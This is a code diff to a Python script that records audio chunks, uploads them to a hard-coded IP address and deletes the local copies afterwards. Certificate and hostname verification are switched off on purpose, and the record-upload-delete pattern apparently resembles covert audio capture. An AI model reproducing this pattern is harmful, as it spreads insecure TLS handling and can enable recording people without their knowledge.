@@ -1,6 +1,6 @@
 import subprocess, os, time, urllib.request, uuid, logging, wave, ssl
 
-UPLOAD_URL = "https://121.88.140.70:8080/api/upload?team=default&auto_analyze=true"
+UPLOAD_URL = "https://121.88.140.70:8080/api/upload?team=onlyou&auto_analyze=true"
 SSL_CTX = ssl.create_default_context()
 SSL_CTX.check_hostname = False
 SSL_CTX.verify_mode = ssl.CERT_NONE
@@ -29,19 +29,25 @@ def record_chunk(filepath):
         stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
     )
 
-    with wave.open(filepath, "wb") as wf:
-        wf.setnchannels(1)
-        wf.setsampwidth(2)
-        wf.setframerate(RATE)
+    try:
+        with wave.open(filepath, "wb") as wf:
+            wf.setnchannels(1)
+            wf.setsampwidth(2)
+            wf.setframerate(RATE)
 
-        while True:
-            chunk = proc.stdout.read(4000)
-            if not chunk:
-                break
-            wf.writeframes(chunk)
+            while True:
+                chunk = proc.stdout.read(4000)
+                if not chunk:
+                    break
+                wf.writeframes(chunk)
 
-    proc.wait()
-    return proc.returncode == 0
+        proc.wait()
+        return proc.returncode == 0
+    except Exception as e:
+        log.error(f"Recording error: {e}")
+        proc.kill()
+        proc.wait()
+        return False
 
 
 def upload_file(filepath):
@@ -79,7 +85,10 @@ def upload_file(filepath):
 
 def upload_and_cleanup(filepath):
     """Upload a file and delete it on success. Returns True if uploaded."""
-    if not os.path.exists(filepath) or os.path.getsize(filepath) < 1000:
+    if not os.path.exists(filepath):
+        return False
+    if os.path.getsize(filepath) < 1000:
+        os.remove(filepath)
         return False
     if upload_file(filepath):
         os.remove(filepath)
